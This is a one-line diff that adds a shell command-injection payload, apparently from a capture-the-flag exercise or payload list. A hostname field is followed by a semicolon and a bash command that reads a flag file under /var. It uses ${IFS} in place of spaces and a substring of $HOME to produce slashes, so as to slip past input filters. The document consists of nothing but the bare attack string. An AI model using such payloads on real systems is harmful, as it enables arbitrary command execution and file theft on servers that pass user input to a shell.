@@ -1,0 +1,1 @@
+google.com;exec${IFS}bash${IFS}-c${IFS}'cat${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt'
